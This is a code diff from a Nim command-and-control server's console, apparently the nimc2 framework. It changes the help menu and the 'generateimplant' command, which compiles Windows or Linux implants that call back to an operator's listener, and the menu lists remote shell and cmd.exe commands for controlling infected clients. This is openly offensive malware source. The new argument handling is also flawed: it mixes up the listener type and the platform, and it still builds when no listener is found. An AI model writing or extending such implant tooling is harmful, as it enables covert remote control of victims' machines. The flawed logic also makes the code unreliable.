@@ -25,51 +25,60 @@ proc procStdin*(server: C2Server) {.async.} =
       case cmd:
         of "help":
             echo "-- Navigation"
-            echo "\texit\twhy would you ever exit?"
-            echo "\tback\tgo back to main menu"
-            echo "\tinteract [id]\tinteract with a client"
+            echo "  exit\twhy would you ever exit?"
+            echo "  back\tgo back to main menu"
+            echo "  interact [id]\tinteract with a client"
             echo "-- Listeners"
-            echo "\tstartlistener [type] [..args]\tstart a listener"
-            echo "\tlisteners\tshow a list of listeners"
-            echo "\tclientlisteners\tshow a list of listeners and their clients"
+            echo "  startlistener [type] [..args]\tstart a listener"
+            echo "  listeners\tshow a list of listeners"
+            echo "  clientlisteners\tshow a list of listeners and their clients"
             echo "-- Implants"
-            echo "\tgenerateimplant [listener type] [listener ID]\tgenerate an implant"
+            echo "  generateimplant [listener id] [platform]\tgenerate an implant (listener id e.g. tcp:0, tcp:1)"
             echo "-- Managing clients"
-            echo "\tclients\tview a list of clients"
-            echo "\tinfo\tget info about a client"
-            echo "\tshell [cmd]\trun a shell command"
-            echo "\tcmd [cmd]\trun a cmd command ('cmd.exe /c')"
-            echo "\tmsgbox\tsend a message box"
-        
+            echo "  clients\tview a list of clients"
+            echo "  info\tget info about a client"
+            echo "  shell [cmd]\trun a shell command"
+            echo "  cmd [cmd]\trun a cmd command ('cmd.exe /c')"
+            echo "  tmsgbox\tsend a message box"
+            echo "-- More info"
+            echo "  Checkout the wiki: "
         # implants
 
         of "generateimplant":
             if argsn >= 3:
                 let args_split = args[1].split(":")
-                let listenerType = args_split[0]
-                let listenerId = parseInt(args_split[1])
-                let platform = args[2]
-                if listenerType == "tcp":
-                    if len(server.tcpListeners) > listenerId:
-                        let tcpListener = server.tcpListeners[listenerId]
-                        infoLog "generating implant for " & $tcpListener
-                        let ip = tcpListener.listeningIP
-                        let port = tcpListener.port
-                        let exitCode = execCmd(
-                            "nim c -d:client " &
-                                "-d:ip=" & ip & " " & 
-                                "-d:port=" & $port & " " & 
-                                (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
-                                "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
-                                ".\\src\\client\\client.nim")
-                        if exitCode != 0:
-                            errorLog "failed to build implant for " & $tcpListener
+                var platform: string
+                var ip: string
+                var port: string
+                if argsn == 3:
+                    platform = args_split[0]
+                    if platform == "tcp":
+                        let listenerId = parseInt(args_split[1])
+                        if len(server.tcpListeners) > listenerId:
+                            let tcpListener = server.tcpListeners[listenerId]
+                            infoLog "generating implant for " & $tcpListener
+                            ip = tcpListener.listeningIP
+                            port = $tcpListener.port
+                            
                         else:
-                            infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ")
-                    else:
-                        errorLog "there are no tcp listeners with id " & $listenerId 
+                            errorLog "couldn't find tcp listener"
+                elif argsn == 5:
+                    platform = args[4]
+                    ip = args[2]
+                    port = args[3]
+                let exitCode = execCmd(
+                    "nim c -d:client " &
+                        "-d:ip=" & ip & " " & 
+                        "-d:port=" & port & " " & 
+                        (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
+                        "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
+                        "./src/client/client.nim")
+                if exitCode != 0:
+                    errorLog "failed to build implant. https://github.com/d4rckh/nimc2/wiki/FAQs"
+                else:
+                    infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ") 
             else:
-                errorLog "incorrect usage. correct usage: generateimplant [listener identifier] [platform]. examples:\n\tgenerateimplant tcp:0 windows\n\tgenerateimplant tcp:0 linux"
+                errorLog "incorrect usage. Check https://github.com/d4rckh/nimc2/wiki/Usage#generating-an-implant"
         # listener management
 
         of "listeners":
